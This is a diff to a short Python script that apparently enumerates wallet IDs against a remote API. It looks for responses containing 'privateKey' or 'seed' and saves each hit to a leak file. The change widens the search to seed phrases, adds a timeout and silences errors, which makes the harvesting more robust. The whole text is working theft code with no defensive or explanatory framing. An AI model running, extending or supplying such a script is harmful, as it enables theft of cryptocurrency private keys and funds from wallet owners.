@@ -10,13 +10,17 @@ for i in range(1, 31):
     payload = {"appId": app_id}
 
     print(f"Trying {wallet_id} ...", end="\r")
-    r = requests.post(url, json=payload)
-    data = r.json()
+    try:
+        r = requests.post(url, json=payload, timeout=10)
+        data = r.json()
 
-    if "privateKey" in str(data):
-        print(f"\nHIT → {wallet_id}")
-        print(json.dumps(data, indent=2))
-        with open(f"leak_{wallet_id}.json", "w") as f:
-            json.dump(data, f, indent=2)
-        print(f"Saved → leak_{wallet_id}.json")
+        if "privateKey" in str(data) or "seed" in str(data):
+            print(f"\nHIT → {wallet_id}")
+            print(json.dumps(data, indent=2))
+            with open(f"leak_{wallet_id}.json", "w") as f:
+                json.dump(data, f, indent=2)
+            print(f"Saved → leak_{wallet_id}.json")
+    except:
+        pass
+
 print("\nDone – download the JSON files on the left")
